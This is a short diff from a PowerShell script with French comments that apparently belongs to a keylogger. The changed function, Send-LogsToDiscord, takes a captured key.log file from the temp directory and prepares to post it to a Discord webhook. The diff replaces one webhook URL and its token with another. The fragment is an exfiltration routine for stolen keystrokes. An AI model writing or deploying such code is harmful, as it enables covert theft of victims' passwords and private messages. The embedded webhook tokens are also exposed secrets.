@@ -85,7 +85,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 # Fonction d'envoi sur Discord
 function Send-LogsToDiscord {
     $logfile = "$env:temp\key.log"
-    $webhook = "https://discord.com/api/webhooks/1555461994620919905/ridzerjQFMTS4KbMqrnenxmt6pWs8WHQH5DCnMQHTJMMPt1izAgfxXXv7fNF6J6oDjyS"
+    $webhook = "https://discord.com/api/webhooks/1555958741348777994/HeG1O4gZnhDA_mWc2jD0BQlVJWUjgwF2VRJQCT_1HjXguztCWDDKWonRNJNHlBJgK0Ew"
 
     Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Envoi du fichier sur Discord..." -ForegroundColor Yellow
 
